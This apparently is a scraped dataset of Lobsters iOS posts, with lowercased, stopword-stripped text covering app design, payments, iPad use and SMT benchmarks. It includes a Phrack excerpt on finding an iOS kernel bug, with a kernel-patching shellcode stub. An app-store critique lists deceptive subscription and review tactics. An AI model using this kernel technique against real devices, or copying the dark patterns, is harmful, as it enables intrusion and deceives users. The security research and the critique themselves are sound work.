preached consistent adherence top priority earliest day mac abstract reason practical reason edition human interface guideline purpose visual consistency construct believable environment user transfer skill one important benefit consistent interface especially beginning user consistency make easier user learn new application also make le likely user follows habit learned one application make disastrous mistake using different one feeling utterly lost different app like knowing use undo mistake original hig made emphasizing especially beginning user seasoned user benefit one whose habit expectation broken apps break convention come think menu bar become vastly underestimated foundation desktop computing heralded menu bar seen vestige arguing io macstyle menu simply pointing without one io platform still floundering establish consistent convention basic feature let alone complex one simple obvious mac imagine going back time tell macpaint user learn use undo appleawardwinning paint app
167,Lobsters,ios,Apple iOS,"Square + Flutter: Beautiful, fast mobile payment apps",https://medium.com/square-corner-blog/square-flutter-beautiful-fast-mobile-payment-apps-539995d2e23a,square flutter beautiful fast mobile payment apps,flutter live event collins family orchard flutter plugin square reader sdk inapp payment sign omnichannel payment try square flutter plugins today,flutter live event showed collins family orchard custom flutter app take inperson payment square collins family fourthgeneration organic family farm selling produce multiple location square year loved using square faced challenge keeping track sale location vendor moving several farmer marketsin order track produce sold location created custom branded point sale app us flutter plugin square reader sdk using locationaware app see made sale flutter collins family quickly created beautiful app integrating square hardware streamline paymentsinapp paymentstoday also announcing flutter plugin inapp payment feature require hardware customer mobile device flutter write code io android square flutter taking pain complexity building apps paymentswithin app customer enter card number use digital wallet make payment add inapp payment plugin flutter app customize look feel leave payment complexity usour inapp payment flutter plugin support popular wallet including google pay apple pay usonly early access also support card file enables safely store card postsale streamline experience future purchase together plugin make frictionfree seamless customer purchase flutter app resulting increased conversion salesyou sign get early access take payment square mobile appomnichannel paymentswith square flutter plugins online inapp inperson custom app payment report single place square seller also get advantage dedicated dispute management team fraud detection powered machine learning wherever taking payment get benefit squarewe following flutter quickly fell love combination fast development experience beautiful output many customer asking u produce flutter plugins seeing fast growth flutter knew make priority supporting carl perry general manager developer platform squaretry square flutter plugins today incredibly excited see build
168,Lobsters,ios,Apple iOS,How to Game the App Store,http://davidbarnard.com/post/180568817995/how-to-game-the-app-store,game app store,game app store app store free market app store millionaire growing anywhere close began blinded apple forest apps weather stuffing keywords spanish mexico localization io weather app admob bonus point completely hiding close button second sell user precise location data david,game app store pestering apple year publicly privately manipulation outright scam going app store apple made progress overall apple strictness area hand approach others disproportionately rewarded bad actor stifling conscientious developersas said many time app store free market apple dramatically shape app store economy similar government shape economy tax law policy apple shape app store economy app review policy app store implementation detail editorial decision app store search algorithm many subtle subtle way love see apple wield power shape app store way sustain encourage meaningful development instead continuing allow deck stacked iti know ramblings failed app developer blame apple shortcoming quite opposite app store millionaire past year provided growing family solely revenue apps apps grossed net income spend lot design share revenue partner pay apple pay self employment tax pay way much health insurance etc made millionaire anywhere close still blown away apps downloaded million people featured countless time apple mentioned everywhere indie blog ny time grossed million dollarsmy critique apple management app store began never embarassing apple denigrating employee motif want see amazing platform apple created best possibly app store incredible marketplace generated ten billion revenue empowering billion people around world amazing thing magical little computer carry around pocket think overall success app store blinded apple need various course correction year financial incentive build maintain great niche apps dry beautiful diverse forest apps app store slowly start look like unkempt play storeso let talk developer gaming app store matter future platform one tactic might seem somewhat bland individually ten thousand apps deploy multiple tactic across many category apps impact measured hundred million user likely billion dollarsi focused researching weather category past couple year working weather app weather tactic apply pretty much every category app storeso top way game app find keyword drive decent amount organic search traffic obvious one keywords like weather calculator solitaire etc keywords competitive rest tactic powerful could get away tier keyword target go app store connect name app exact keyword weather already taken apple allow duplicate app name need add symbol let go weather thing app store search algorithm give massive boost exact match user searched algorithm ignores symbol weather get huge search advantage help drive organic installs app lot hack manipulate app store search algorithm kept black hat tactic sure work anymore fun one app store search algorithm index multiple language per app store localization double keywords u app store stuffing keywords spanish mexico localization app store search app template minimize amount code write functionality app terribly important long cover basic user might expect downloading app called weather one look perfect cost io weather app admob weather data cost money trying maximize revenue cost proxy weather apps request data borrow api key happen find hear apple weather app might good place implement tricky subscription page high priced subscription price far removed sort continue trial button also hide button used close page bonus point completely hiding close button second user feel compelled tap continue button apple starting crack thing tough enforce might get lucky watch company like apalon cue user hostile apple allow subscription page need inspiration trick user full list compiled actual scam app store trigger subscription randomly app running one included list cunning worth specific mention iphone home button serf sort universal back button panicking iphone user likely hit home button trying get something unfortunately iphones touch id home button also confirm purchase payment view randomly triggered many user accidentally confirm purchase trying exitvideo sign teemo revealmobile factual firm use many want simultaneously sell user precise location data cold hard cash still baffled apple allows given stance user privacy make hay sun still display full screen ad every second andor user tap certain button app user experience horrible shocking much user tolerate money great ecpm full screen ad banner ad ad app launch randomly promote apps terrible user experience hey work app live app store start buying fake rating review one blatant violation apple rule seem penalize apps „ÉÑ pay keyword boost campaign user paid search specific keyword download app teach app store search algorithm app great match specific keyword thousand dollar rocket app top important keywords reinforced get organic downloads use custom review prompt filter user likely positively review app beg bit good measure rule app store review guideline forbids custom review prompt hard catch probably get away obvious widely used tactic gaming app store hundred experimented one explicitly rule mirror app sold last fall know powerful becumulatively apps using tactic creating billion terrible experience io user choking developer care building great experience respecting user employing tactic apps far profitable afford pay acquire user make really tough apps employing tactic compete acquiring user gaming app store search apps make nearly impossible conscientious developer get organic search traffic high volume keywordsthere absolutely way succeed app store despite know year heck lot harder bigger point writing apple shape app store economy way reward conscientious developer punish bad user experience given apple genuine concern privacy great user experience io shocked allowed app store fall prey much manipulation outright scamming icing cake apple recently featured app one notorious app store abuser apalon featuring app great carrot apple generally feature apps blatantly flaunt app store manipulation user hostile tactic carrot getting featured pale comparison much money made gaming app store well past time apple employ carrot create great experience app store use bigger stick manipulating app store creating terrible user experience apple customersdavid
169,Lobsters,ios,Apple iOS,tbodt/ish - Linux shell for iOS,https://github.com/tbodt/ish,tbodtish linux shell io,hacking build io build command line tool testing alpine website logging note jit,project get linux shell running io using usermode emulation syscall translation current status project check issue tab commit log hacking project git submodule make sure clone recursesubmodules run git submodule update init cloning need thing build project python ninja meson pip install meson clang lld mac brew install llvm linux sudo apt install clang lld sudo pacman clang lld whatever common may already installed linux definitely already installed mac something like sudo apt install build io open project xcode open ishxcconfig change rootbundleidentifier something unique click run script everything else automatically run problem open issue try help build command line tool testing set environment cd project run meson build create build directory build cd build directory run ninja set selfcontained alpine linux filesystem download alpine minirootfs tarball alpine website run toolsfakefsifypy script specify minirootfs tarball first argument name output directory second argument run thing inside alpine filesystem ish f alpine binlogin f root assuming output directory called alpine replace ish toolsptraceomatic run program real process single step compare register step use debugging requires linux later logging ish several logging channel enabled build time default disabled enable xcode set ishlog setting ishxcconfig spaceseparated list log channel meson command line tool testing run meson configure dlog spaceseparated list log channel available channel strace useful channel log parameter return value almost every system call instr log every instruction executed emulator slows thing lot verbose debug log nt fit another category grep defaultchannel see log channel added since list updated note jit possibly interesting thing wrote part ish jit actually jit since nt target machine code instead generates array pointer function called gadget gadget end tailcall next function like threaded code technique used forth interpreter result speedup roughly compared pure emulation unfortunately made decision write nearly gadget assembly language probably good decision regard performance though never know sure horrible decision regard readability maintainability sanity amount bullshit put compilerassemblerlinker insane like demon make sure code sufficiently deformed make stupid reason nt compile order stay sane writing code ignore best practice code structure naming find macro variable descriptive name s assembler macro nested beyond belief top almost comment warning longterm exposure code may cause loss sanity nightmare gas macro linker error number debilitating side effect code known state california cause cancer birth defect reproductive harm
170,Lobsters,ios,Apple iOS,Getting the iPad to Pro,https://craigmod.com/essays/ipad_pro/,getting ipad pro,benchmark ar technica point say writing context write photograph book audio email ia writer scrivner ulysses john mcphee photography nilay patel miscellany usability issue tascam recorder update blink recently figured mike matas bret victor future computing affinity noted,love ipad conflicted ipad bullish achips power ipads future computer know drill like clockwork sleek new ipad pro bit lighter nicer screen much faster processor fact new ipad pro highpowered benchmark close topoftheline macbook pro intelpowered laptop apple apple hardcore subtweeting intel via ar technica interview magic getting kind power device devoid mass heat gruber point powerperbuck unmatched apple history say powerpercubicmillimeter even impressive super computer shoved thin space beneath extratough glass digislates actual gibsonian stephensonian object future throw backpack hundred gram big screen cellular highspeed connectivity allday battery life uhm yes please new ipads arguably beautiful least beautifully minimal compute device ever made apple unambiguously positioning ipad computer want pro computer intuitive way say ipad ask work like computer way computer follow cryptically hammer computer idea home new ipads even usb typec port connect move seems rally newtonian fundamental touchscreen tablet external monitor serious workhorse right used ipads eight year ever since incredibly clunky oddly enthralling version one mostly confusing heck thing definitely excellent hypnotizing small child restaurant since release io basic multitasking could maybe maybe earnestly use potential laptop replacement new ipads may gorgeous piece kit ipad pro also beautiful machine svelte overpowered fact ipad pro hardware engineering silicon team probably impressive unit apple recent year problem almost none usability productivity issue ipads hardware issue say year shortcoming io gut level ipad hardware feel two three year ahead software unfortunate unfixable computer james ball http wwwdocubytecomworksguidetocomputing computer flaw assume marketing seems imply apple want u treat machine primary computer assume professional computer folk complicated computer thing used heck ipads past year believe two big software flaw make io great keep succeeding device io primarily designed overly dependent singlecontext computing access lower level ie filelike system component necessary professional edgetasks one big general flaw keep superb many software company still treat ipad first class computing platform dig realworld example issue present problem writing context computer write edit photograph design book record edit audio send email research online also bit web development time time sit terminalapp giting thing knocking side server ipads writing fine especially since release smart keyboard ipad pro smart keyboard feel like nearly indestructible grossly overpowered writing machine ia writer scrivner ulysses full featured totally serviceable writing apps write anything grocery list john mcpheeesque nonfiction opus ipad export pdfs epubs docx file io first foremost designed singlecontext use default view fullscreen focusmode icloud syncing storage option matured work reliably handing document ipad iphone desktop often seamless good far problem begin need multiple context example open two document program sidebyside allowing reference one set edits applying new document similarly frustrating open document sidebyside weird use case realize often laptop best solution found use two writing apps copyandpaste open two apps splitscreen mode daily ipad use riddled sort kludgey solution switching context also cumbersome researching browser frequently jumping back forth say actually quite wonderful notesapp safari sometimes find cursor position lost notesapp document editing fully occasionally resetting top long document infuriating make every cmdtab feel dangerous always happen behavior unpredictable making thing worse interface brittleness make feel like using o wrong way writing apps page position might remain cmdtab cursor position lost leading frustrating circus cmdtab start typing realize nothing happening tap screen cursor insert wrong position longpress screen get precise input move cursor need start typing murder flow creates cost switching context simply exist macos exist modern computing device photography photography usher whole separate class headache unquestionably ipad pro ultimate photography editing machine gorgeous high resolution widegamut color screen perfect multitouch sensitivity aclass chip able rip raw file fail simple task like importing image arduous lighting sd card reader import photosapp meaning want edit program lightroom cc example need import photosapp reimport lightroom go back photosapp delete raw file using double space store image nilay patel astutely observes unflinching ipad pro review best way lightroom cc photography ipad first import desktop apple seems think photosapp main image dumping ground program shimmy around sadly work field photography camera different iphone mingling two context recipe headache flip side nearly photo icloud library going back eighteen year many photo taken pointandshoot digital camera one iphone displaced camera improved able scan archive find old memory whim getting coffee old university buddy example feel like magic parlor trick professional need professional perspective intuitively able import image directly context want dropbox lightroom whatever app container support image format imported fact treat sd card storage container unto frustrate photo side thing bleeds pro activity relentlessly hammer home point traveling recently ipad hand realized update firmware order enable new wifi image transfer hoping might get around sd import issue task download file website put root sd card insert back camera simple desktop long right dongle one would think recently revamped filesapp browser various cloud service sd card would also appear another storage container ala impossible put file web root directory sd card io argue camera maker seamless updates√¢ maybe connecting camera network checksuming file digitally signing securely downloading installing firmware also reasonably argue united state using metric measurement mean happen even photo finally imported find program like lightroom cc io hamstrung baffling way editing lightroom cc desktop make half dozen virtual copy good image quickly compare different crop edits io ability make copy image inexplicably infuriatingly present get one copy image per album sure limitation simply highlight ipad software still despite amazing hardware considered second class citizen many major software company miscellany usability issue past month begun produce field recording walk mountain little interview recorded highfidelity impossibly small light tascam recorder lavalier ideal able edit recording field without lug around laptop might guess impossible get data sd card io google doc sheet work ipad lack many feature find desktop browser missing esc key ipad make painful spreadsheet editing using current model user interaction update reader wrote inform cmd work like esc key io low behold spreadsheet little le painful many apps even exist ipad instagram example never bothered release ipad version iphone app fortunately ipads able run iphone apps kind emulation mode unfortunately portrait orientation even though processor long since powerful enough run software like indesign adobe ported nobody else incentivized build damn would nice set type screen zoomed kerning hand though make book work halfdozen context pulling text one place image another editing chart illustration yet elsewhere exporting test printing ipad trouble juggling two three context shudder imagine wrangling usual book design workload onto io server development tricky way io built never know program reset background network connection terminal still active impossible tell took blink two year tackle look like recently figured hold session across collapsing apps still pro user want app state reliably consistent apps vibrate somewhere alive rebooted multitasking ipad requires pretty odd finger dance tap hold drag bit one mode drag bit farther another dragging splitscreen bar change ratio split requires long press slow drag look like full refreshes running apps lumbering clunky fluidity missing interaction see work mike matas bret victor example fluid multicontext interaction everything o could active object considering power machine flow like mini minority report workstation still edgecase ipad interaction beautifully bewildering example open app possible initiate app visible dock dragging current running app close edge screen slide floating window screen next time tap app dock open floating window fullscreen instance anyway even typing sentence make much sense near endless bag nit share last year kept text file wall run using ipad pro pro machine pedantic maybe also kind fun last time able watch company really figure new o public run usability issue make wonder two thing trying something way strange habit unnecessary expectation bringing table would simplicity io subverted allowing new thing happen computer nothing constellation design engineering detail either work either push forward smoothly encouraging tailwind allowing get done work want get done push back become abrasive breaking flow state causing google even simplest task lost hour day trying open open office document banana ipads better close certainly powerful enough ipads today far cry oddly rounded difficult hold heavy lowish resolution first version ipad released new ipad pro hardware perspective whispering hedged hyperbole quite possibly impressive certainly beautiful consumer computer ever made expectation high expect easily recently returned ten day hike brought ipad pro felt solid reliable never worried getting wet breaking love quality resilience ipads even smart keyboard dy still type screen burned field two macbook pro failing one screen keyboard mainly hike ipad day comparatively feel indestructible hike able clunky infield photo import backup able backup audio recording irksome able type note small hut top mountain interviewed buddhist sculptor carried extremely light machine meter vertical ascent sleet rain never worry device letting still came home opened macbook pro sang macos clunky way nearly fifty year ui idea piled atop incumbency older technology making complex damn sings responds quickly type need hack together solution figure open weird file automate process drag data one space another io mitten precision surgical feel like machine trust adult future computing io began succeeded rigorous exercise singlecontext computing original iphone io revolutionary marrying simplicity explicit interaction apple established new massmarket baseline computer interaction iphonesized device io today still marvel ipad external keyboard bit mess ideal computing software optimized delightful bicycle mind exists somewhere io macos today need shed complexity macos allow touch track pad example feel downright nonsensical editing photo ipad pencil interface also need move speed thought person using need delight swiftness capability infuriate plodding niggling shortcoming keystroke lost context switch data feel locked box inaccessible corner hope hardware beautiful powerful announced last week company consumer pay attention compared two year ago software ipad already mature place company like affinity produce professional level firstclass apps ipad next two year start see genuine port cornerstone creativity apps like photoshop theoretically process porting company like adobe opportunity refactor decade old software making faster better macos equivalent professional software palate cleanser win get current hump want believe buy one new ipads seductive beyond reason buy knowing well limitation may knowing also get better engine year ahead software owning one able follow along contemporary operating system matures realtime betabybeta eye often get enjoy though ipad still good writing amazing sketching reliable tank switch quickly apps expect cursor think try anything fancy file design book hope open two document app sidebyside yet noted
171,Lobsters,ios,Apple iOS,SMT Solving on an iPhone,https://homes.cs.washington.edu/~bornholt/post/z3-iphone.html,smt solving iphone,smt solving iphone november processor design team mac use arm processor geekbench others smt solver iphone x first test run io device profiling symbolic evaluation rosette going vtune mate soos spent propagation cachesensitive gigantic low latency cache rapid march apple silicon meghan cowan max willsey eddie yan,smt solving iphone november buy expensive desktop computer iphone faster smt solver day ago tweeted seeing discussion incredible progress processor design team making long mac use arm processor report usually cite crossplatform benchmark like geekbench show mobile processor least fast laptop desktop chip always little skeptical crossplatform benchmark others really represent sort workload use mac formal method researcher real computeintensive workload run regularly smt solving usually smt solver point spent lot time learning performance characteristic also peculiarity benchmark suite capture generally single threaded recently bought new iphone x featuring latest processor fit procrastination decided crosscompile io see fast new phone hypothetical future mac first test crosscompiling turn remarkably simple line code change necessary open sourced code run io device benchmark drew query recent work profiling symbolic evaluation extracting smt output generated rosette case first test compared iphone x one desktop machine us intel core best consumer desktop chip intel selling built machine month ago expected intel chip win quite handily thing turned iphone x faster second benchmark result tweeted twitter leave much room nuance add benchmark qfbv fragment smt discharge using bitblasting sat solving result hold pretty well even benchmark run loop iphone sustain performance seem thermally limited said benchmark still pretty short several folk asked solver take different path different platform due use random number checked fairly thoroughly using verbose output seem case system ran compiled using clang optimization setting also tested using prebuilt binary use gcc actually slower going could possible desktop cpu running singlethreaded workload draw around watt power clock ghz contrast iphone unplugged probably draw power run believe somewhere ghz range indeed benchmarking checked battery usage report said slack used time energy app despite le time screen apple expose enough information understand performance iphone luckily intel desktop processor spent time poking around using vtune see bottleneck running desktop mate soos observes sat solving time spent propagation cachesensitive vtune agrees say spends lot time waiting memory iterating watched literal key performance seems cache size memory latency effect might explain iphone strong chip gigantic low latency cache also seems better memory latency cache miss compared rapid march apple silicon test whether diagnosis correct ran broader experiment gathering apple device could get hand also chose benchmark time slower ie minute desktop mitigate concern mobile burst performance result device gathered graphed according release date relative apple first custom cpu design first thing note desktop processor beat iphone x different longer benchmark iphone incredibly competitive falling predecessor fastest consumer desktop processor two year ago fun also added intel core processor macbook iphone x faster laptop running really remarkable thing trend apple fairly consistency yearonyear improvement benchmark obviously draw many conclusion one silly benchmark seems like take one two iteration trend apple cpu make total sense workload honestly expect smartphone architecture incredible thanks meghan cowan max willsey eddie yan helping track device run experiment
172,Lobsters,ios,Apple iOS,iOS Siri Shortcuts I use activated from Widgets,https://github.com/nikitavoloboev/my-ios#widgets,io siri shortcut use activated widget,wonderful world io focus blank name macos application productivity flexible task manager strong workout tracker apple watch streak workout password manager drive cloud storage github github go wipr safari ad blocker update budget paprika recipe manager social tweetbot twitter client apollo reddit client spark mail client slack team communication photo photo photo library darkroom photo video editor slidebox photo album organizer share life learn reeder r reeder medium online publishing platform trello project management tool write wiki monokai night theme music spotify music streaming playlist sharing travel google map gps city navigation traffic automation scriptable automation using javascript edit code mac dev page makeovr apps widget shortcut shortcut translate event next ask place contact cardhop tweet focus dark noise podcast podcast episode hn hckrnews photo drive sort slidebox note mail spark home record dictate km macro control center watchos fantastical streak workout ipad procreate sidecar game similar repository related contributing suggestion say thank github project,wonderful world io list application tool make io experience even amazing focus two active space phone minimize hand movement use folder blank name reduce noise keep non essential apps away everything optimized reachability ideally aesthetic color matching use dark mode always io macos tend vary light dark theme depending whether sunny area iphone consumption communication device limited creation everything phone faster better macos thus limit focus kind activity phone podcasts talking twitterreddithn making photo application list apps use day day life sorted category importance productivity flexible task manager prefer stock calendar app due cleaner design ability add event quickly natural language strong workout tracker use track workout custom workout made start simply follow exercise number set exercise workout progress usually start track workout apple watch using streak workout start bodyweight exercise workout workout start cardio workout runningcycling password manager ca nt live without app hold password anything private need remember one thing master password seamlessly integrates o autofill saved password second drive cloud storage document file stored icloud however google docssheets amazing tool collaborating document github github go use respond create issue github keep date activity watched repos wipr safari ad blocker use app block annoying ad tracking safari use app track ongoing subscription review end every month update budget month accordingly paprika recipe manager one best feature safari fast access bookmark opening new tab top bookmarked site use social favorite messenger due speed ability sync native macos client many free awesome sticker use use pocket add link want check point time also use telegram saved message send message linksquicktodos higher priority pocket adding quick todo telegram much quicker assumed todonote dealt soon possible also use saved message share medium device tweetbot twitter client favorite twitter client prefer official client ability sync timeline macos app night theme ad use official twitter app searching profile suggestion search tweetbot nt apollo reddit client favorite client browsing reddit love operate app seamlessly gesture also customized app work gesture ie swiping back forth initiating swipe middle screen side spark mail client favorite email client love due simplicity ui ux well separation email based type inbox newsletter slack team communication keep essential team signed photo photo photo library place personal photosvideos synced icloud love memory feature darkroom photo video editor use quickly edit photograph made prefer filter editing option photo editor slidebox photo album organizer use app quickly delete bad photo sort photo album quickly try photo photo library placed folder app let easily love way share life photograph video story learn listening podcast relaxing playing music listen book reeder r reeder use read book pdf epub listen audio book downloaded audible nt amazing beautiful wikipedia reader typography design make explore easily get lost reading wiki medium online publishing platform use app read article trello project management tool write use app make edits wiki since wiki bunch markdown file folder keep dropbox add folder ulysses external folder make edits use monokai night theme music spotify music streaming love using due superior music recommendation uiux social feature like playlist sharing travel google map gps city navigation traffic automation scriptable automation using javascript let write javascript code combine siri shortcut even edit code mac instantly run shortcut phone plan learn use well write sophisticated shortcut dev page develop apps io page dedicated development apps empty icon added makeovr apps go describing top apps use folder content folder name apps inside widget widget use shortcut color shortcut use gray color consistency top shortcut use activated widget seen translate open google translate event create new event fantastical next show direction next event ask ask google assistant place find workparkslibrariesgroceriesrestaurantsattractionscafeshome google map make new task contact type cardhop tweet start typing new tweet focus play rain sound using dark noise podcast play recently played first unplayed podcast episode hn open hckrnews safari new tab photo open camera app take photovideo drive search google drive sort open slidebox note open ulysses favorite note saved open telegram saved message replicate adding action send message telegram provides mail create new mail spark home show public transport direction home google map record start recording audio tap stop share dictate start recording speech transcribe text tap stop share text use test shortcut prototype new actionsideas quickly duplicate working prototype give appropriate name use prototyping idea km macro control center control center look watchos use apple watch way track health fitness view useful information glance like current time event use one infograph modular watch face show current time day weather current future calendar event fantastical also let quickly start cardio workout runningbiking bodyweight workout streak workout also start timer see time timer one already running ipad mostly use ipad drawing sketching procreate apple pencil using second screen sidecar game prefer using playing game game much better game like still io found interesting also similar repository going application use macos related contributing suggestion pull request highly encouraged love finding new awesome tool apps favorite tool app think missed please say thank support github look project shared
173,Lobsters,ios,Apple iOS,Why I'm Ditching Android,https://kevq.uk/why-im-ditching-android/,ditching android,degoogling life thing replace massive fail google ad vortex digital content next paper summary paper bleeping computer bloatware notification iphone se conclusion ditched android ditched io let know thought,regular reader blog know went process degoogling life ago part think process pretty successful however thing replacefast forward year lot trial error ready take next step removing google life ditching androidfirst tried ditch smartphone completely massive fail tried replacing android lineage o old phone whilst meant google apps device still android underneath also many apps kept complaining google service device got old quickso last night decided ditching android completely ordered apple iphone se probably think jumped frying pan fire let explain rationale behind google ad vortexunless living rock last decade sure probably aware google business model based around advertising make money lot service free producton hand apple business model based around hardware yes hardware grossly overpriced flagship android phone pretty much inline apple day moot point reallybecause google make money advertising best interest get much information possible need look recent digital content next paper proved android sends data back google apple doeshere good summary paper bleeping computer bothered reading pagesbloatwareandroid vendor almost bad window come bundling additional application device almost meme point least window uninstall bloatware bloatware android device used year removed marked system appsand want remove google proprietary apps like google drive google search google photo forget system apps uninstalledthe also true io certain degree however android much prevalent use hicare huawei weather huawei music let bloody remove notificationsin last update received android around month ago new battery saving measure implemented whilst battery life huawei really good done something funky notificationsi hardly ever get notification email calendar event social medium etc assume battery saving measure kill background process apps carry background task like checking new emaili tried work around using battery optimisation setting android get work number occasion missed important email phone decides want notify mewhy iphone se gon na flip apple get latest device right well one pet hate phone day sheer size basically tablet pocket want phonethe iphone se actually phone sized device cheap still supported apple seemed like nobrainer give tryconclusioni doubt issue flipping iphone se already ipad whilst perfect solution ditching android favour io another step towards getting rid googlei never going completely get rid google impossible point think right decision se get delivered week post update month use let guy know getting onhave ditched android ditched io let know thought
175,Lobsters,ios,Apple iOS,Viewer Discretion Advised: (De)coding an iOS Kernel Vulnerability,http://phrack.org/papers/viewer_discretion_advised.html,viewer discretion advised de coding io kernel vulnerability,title author date,title viewer discretion advised de coding io kernel vulnerability author adam donenfeld date october viewer discretion advised de coding io kernel vulnerability adam donenfeld doadam table content introduction sandbox concept bug got started iosurface bug finding primitive iosurface bug tracing io kernel reversing influencing via mediaserverd bug general io mediaserverd nt read fucking manual takeaway final word reference code introduction goal article demonstrate relatively hardtoreach attack surface io showing entire process beginning research till point vulnerability found exploitation scope article understanding process defining attack surface researching making life easier see section provide beginner expert hacker alike different approach sandboxaccessible vulnerability research bug question found truly adam donenfeld doadam poc vulnerability also available paper free use educational purpose exploit imo written vulnerability many thing writing paper instance feel like working exploit feel free write want help without ado let start sandbox concept modern operating system process default restricted sandbox technology sandbox extra layer protection prevents certain process accessing certain mechanism sandbox mandatory many reason instance preventing leakage sensitive information example let take case attacker breached phone using webkit exploit webkit steal information related browsing able read contact sandbox check try access contact denies permission unless legitimate reason attacker gained code execution using vulnerability contact app probably able access contact narrowing attack surface vulnerability found different unrelated component system shown soon world io interesting example directory traversal could triggered via airdrop connection io daemon question sharingd directory traversal ultimately gave attacker write file primitive meaning attacker could overwrite file system sharingd running unsandboxed root back vulnerability alone enough various powerful operation installation arbitrary app example apple since sandboxed sharingd sharingd would sandboxed publication vulnerability alone would nt powerful primitive privilege could gained substantially limited sandboxed sharingd could nt write file system thus could nt manipulate installd install arbitrary application fixing vulnerability like one sharingd solve specific issue alone nt approach main issue exploit sharingd result compromise entire device result lot vendor apple among designed system almost everything sandboxed nowadays almost every operation requires hardware interaction sandboxed given upon permission userapple vulnerability discussed paper accelerated hardware decoding driver let see approach apple took sandboxing video operation namely video encodingdecoding following graph demonstrates app would interact videodecoding driver would sandbox user mode kernel mode decode video request io app decode video response fortunately apple communication every hardware accelerated encodingdecoding driver sandboxed meaning request go broker mediaserverd extremely timeconsuming attacker mean communication defined mediaserverd unprivileged attacker ca nt access exotic feature without prior access driver code execution privileged context like mediaserverd unprivileged apps communicate user mode kernel mode decode video new request sanitized request io app mediaserverd decode simplified response decode response basic video frame validation confined api check decodingencoding permission see diagram mediaserverd sanitizes request never forward request fact recreates requestresponse accordingly limit attacker power causing memory corruption performing infoleaks bug got started iosurface bug hidden deeply within file intention reverse engineer found pursuit candidate different bug found apple silently fixed without issuing cve bug scope article order understand originally found important background bug bug driver called iosurfacekext iosurface object primarily store framebuffers pixel information iosurface allows transferring lot information process framebuffers without causing lot overhead iosurface object id used request iosurfacerootuserclient object iosurfaces map information different process thus save overhead sending lot information process io lot driver use iosurface come graphic user nt store anything iosurface object except id mean order use iosurface object example video decoding user need supply id appropriate driver original video extracted iosurface video never sent driver part request iosurface object store lot property graphic one called plane brevity sign mismatch offset plane mean driver used plane offset base would negative int kernel iosurface getplanesize function regarded plane offset vulnerability resulted buffer overflow surface object store information without really using eg performing memory manipulation based plane offset necessary find different driver used plane offset actually perform buffer overflow anything else would give u primitive bug finding primitive iosurface bug fortunately driver want use iosurface object find iosurfaceroot service public named kernel registryas iocoresurfaceroot mean driver actually need iosurface string iocoresurfaceroot please note ioregistry nt within scope paper however read following apple document http developerapplecomlibraryarchivedocumentationdevicedrivers conceptualiokitfundamentalstheregistrytheregistryhtml looking string ida yield following result prelinktext prelinktexthidden iocoresurfaceroot comappleiokitiosurface cstring iocoresurfaceroot cstring iocoresurfaceroot comappleiokitiomobilegraphicsfamily cstring iocoresurfaceroot cstring iocoresurfaceroot comappledriverappleave cstring iocoresurfaceroot cstring iocoresurfaceroot comappledriverappleavd cstring iocoresurfaceroot cstring iocoresurfaceroot comappleiokitioacceleratorfamily cstring iocoresurfaceroot comappleiokitioacceleratorfamily cstring iocoresurfaceroot apple driver mostly closedsource take lot effort understand driver us iosurface object therefore necessary easy look string plane one driver nt guarantee actually find anything useful easy nt consume lot time fortunately following string came newlines added readability assertion outwidth piosurfacedst getplanewidth outheight piosurfacedst getplaneheight outwidth outheight inwidth inheight failed line goto around usage string following assembly code sxtw mov mov bl memset closedsource one need guess lot try infer code context function search usage iosurface object vtable one useful thing would add comment around every virtual call function name corresponding iosurface object plane string mind expect virtual call contain plane name find vtable iosurface vtable object kext possible reverse engineer kext macos kexts still symbolicated macos therefore possible obtain meaningful name vtable entry sake example reverse iosurfacekext opening iosurface kext binary macos located following path systemlibraryextensionsiosurfacekextcontentsmacosiosurface get symbolicated kext get actual iosurface vtable simply open name view keyboard shortcut lover search string vtable foriosurface give u vtable along entry symbolicated although sometimes vtable entry different order virtually minus diff arm intel cpu necessary make sure look function blindly picking name macos version indeed work ldr ldr iosurface getplanesize mov mov blr iosurface getplanesize mov ldr ldr iosurface getplanesize mov mov blr iosurface getplanesize mov sxtw mov ldr sp bl memset memset unk sxtw mov mov bl memset memset unk look new primitive arbitrarily overwrite something control length overwrite control unk later revealed mapping iosurface object keep reading length taken plane member something assume iosurface object arbitrarily control using vulnerability iosurfacekext obviously far fetched assumption except string found nothing else hint indeed iosurface object verify necessary first understand videodecoding driver accessible default sandbox communication device done solely via mediaserverd described infographic section next objective see trigger function iosurface usage function approximately function entry point driver communication externalmethod apple provide u right tool debug io kernel fact constantly make complicated macos nt driver guessing get started getting deterministic codeflow something want assure assume direction research might oriented based assumption tracing io kernel took thanks qwertyoruiopz macrograss utilized kpp bypass kpp new mechanism introduced io checking integrity text section kernel meaning ca nt modify kernel text section nt care setting breakpoints kernel wanted get dump register given specific address would enough understand control codeflow least progress steadily towards function us plane iosurface object understand whether actually iosurface object first place follows assuming want see register state address kernel code kpp address overwrite byte following assembly code ldr blr quad shellcodeaddress shellcodeaddress contains code print register state snippet shellcode stp sp stp sp ldr debugstr ldr kprintf blr mov mov mov mov ret overwriting last nop instruction mov replaced original instruction way code executes seamlessly long branch replaced chosen according abi used jumping stub safe overwrite way see register state almost address kernel without hurting performance slowing research generally speaking found infrastructure work time consuming might insanely helpful later always worth invested time ultimately state kernel text look like following ldr blr quad memcpy address ldr blr stp sp shelladdr stp sp quad ldr kdebugstr ldr kprintf blr old insn old insn ret back orig code shellcode advance well return valid instruction restored upon shellcode execution time writing public way achieve result important point like show infrastructure work extremely important think every decent researcher experience field written toolsscripts ease research process besides returnappearance amcc bypass could sleep handy reversing continuing research know something iosurfaces next step see driver actually look upfetches iosurface object based id quick string search reveals following string allocatekernelmemory kallocmaptypeiosurface lookupsurface failed dn going place string used thing added comment near every virtual call see driver probably us iosurface probably guess automated script another infrastructure work indeed looked like iosurface object verify used kernel tracing technique like checked vtable object use indeed iosurface vtable mean know iosurface object looked iosurface stored exactly offset used mysterious memset call using kernel tracing technique see indeed iosurface object used memset well control iosurface object arbitrary write unfortunately point apple silently fixed iosurface plane bug got involved research deep enough continue researching area next part make sure control iosurface object obviously assuming magically send right port perhaps influence mediaserverd supply iosurface object influencing via mediaserverd reverse engineering mediaserverd looking call anything look like yielded result investigation symbol string search saw videotoolbox responsible video decoding thus assumed responsible well though mention videotoolbox looking string entire dyldsharedcache found library named contained several different reference one interesting call flow ioconnectcallstructmethod calling one driver exposed usermode api xrefs unfortunately code nt written used would optimized case assumed function might inside vtable binary search ida address indeed resulted something looked like vtable vtable used object initialization code function called exported function symbol xrefs string appear videotoolbox appears videotoolbox treated dynamic library entry point found dlsym actually trigger usage driver without send right driver needed following xpc request mediaserverd 